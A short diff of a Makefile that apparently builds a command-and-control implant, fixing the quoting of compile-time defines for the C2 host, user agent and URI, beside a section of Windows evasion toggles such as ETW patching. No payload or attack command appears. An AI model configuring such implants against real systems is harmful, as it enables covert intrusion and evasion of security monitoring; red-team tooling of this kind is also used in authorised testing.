@@ -18,7 +18,7 @@ C2_URI        ?= /api/submit
 
 # ── Common defines ──
 COMMON_DEFS = -DC2_HOST=\"$(C2_HOST)\" -DC2_PORT=$(C2_PORT) -DUSE_HTTPS=$(USE_HTTPS) -DUSE_MTLS=$(USE_MTLS)
-COMMON_DEFS += -DC2_USER_AGENT=\"$(C2_USER_AGENT)\" -DC2_URI=\"$(C2_URI)\"
+COMMON_DEFS += '-DC2_USER_AGENT="$(C2_USER_AGENT)"' '-DC2_URI="$(C2_URI)"'
 
 # ── Windows evasion toggles ──
 ENABLE_ETW_PATCH     ?= 1
